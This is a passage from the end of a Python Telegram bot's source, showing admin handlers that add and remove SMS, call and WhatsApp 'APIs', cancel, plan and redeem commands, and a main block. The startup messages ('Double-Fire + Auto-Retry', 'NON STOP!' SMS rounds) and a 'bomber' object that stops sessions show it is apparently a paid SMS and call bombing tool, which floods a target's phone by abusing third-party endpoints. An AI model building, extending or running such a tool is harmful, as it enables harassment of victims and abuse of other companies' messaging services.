                del admin_data[chat_id]
                return
            
            name = parts[0].strip()
            url = parts[1].strip()
            method = parts[2].strip().upper() if len(parts) > 2 else "GET"
            headers = {}
            if len(parts) > 3 and parts[3].strip():
                for h in parts[3].split(","):
                    if ":" in h:
                        k, v = h.split(":", 1)
                        headers[k.strip()] = v.strip()
            body = parts[4].strip() if len(parts) > 4 else None
            category = parts[5].strip() if len(parts) > 5 else "sms"
            
            new_api = ApiConfig(name, url, method, headers, body, category)
            ALL_APIS.append(new_api)
            
            if category == "call":
                CALL_APIS.append(new_api)
            elif category == "whatsapp":
                WHATSAPP_APIS.append(new_api)
            else:
                SMS_APIS.append(new_api)
            
            bot.reply_to(message,
                f"✅ *API Added!*\n\n"
                f"📛 Name: {name}\n"
                f"🔗 URL: {url}\n"
                f"📌 Method: {method}\n"
                f"📂 Category: {category}\n\n"
                f"Total APIs: {len(ALL_APIS)}",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "remove_api_waiting":
        name_to_remove = text.strip()
        found = False
        for i, api in enumerate(ALL_APIS):
            if api.name == name_to_remove:
                ALL_APIS.pop(i)
                found = True
                break
        
        if found:
            CALL_APIS.clear()
            SMS_APIS.clear()
            WHATSAPP_APIS.clear()
            for api in ALL_APIS:
                if api.category == "call":
                    CALL_APIS.append(api)
                elif api.category == "whatsapp":
                    WHATSAPP_APIS.append(api)
                else:
                    SMS_APIS.append(api)
            
            bot.reply_to(message,
                f"✅ *API Removed!*\n\n"
                f"📛 Name: {name_to_remove}\n"
                f"Total APIs: {len(ALL_APIS)}",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        else:
            bot.reply_to(message, f"❌ API '{name_to_remove}' nahi mili!", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

# ============================================================
# /cancel COMMAND
# ============================================================
@bot.message_handler(commands=['cancel'])
def cmd_cancel(message):
    chat_id = message.chat.id
    if chat_id in admin_data:
        del admin_data[chat_id]
        bot.reply_to(message, "❌ Cancelled.", reply_markup=main_keyboard(chat_id))
    else:
        bot.reply_to(message, "❌ Kuch bhi pending nahi hai.", reply_markup=main_keyboard(chat_id))

@bot.message_handler(commands=['plans'])
def cmd_plans(message):
    btn_plans(message)

@bot.message_handler(commands=['redeem'])
def cmd_redeem(message):
    btn_redeem(message)

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    print(f"📊 Total APIs: {len(ALL_APIS)} (Call: {len(CALL_APIS)}, SMS: {len(SMS_APIS)}, WhatsApp: {len(WHATSAPP_APIS)})")
    print(f"⚡ Max Workers: {MAX_WORKERS} (SMS: {SMS_MAX_WORKERS} with Double-Fire + Auto-Retry)")
    print(f"⚡ SMS Delay: {SMS_DELAY_BETWEEN_ROUNDS}s — NON STOP!")
    print(f"✅ Bot is running! Press Ctrl+C to stop.")
    print(f"👑 Admin ID: {ADMIN_IDS[0]} — Admin panel active!")
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("\n🛑 Stopping all sessions...")
        stopped = bomber.stop_all()
        print(f"✅ Stopped {stopped} sessions. Bye!")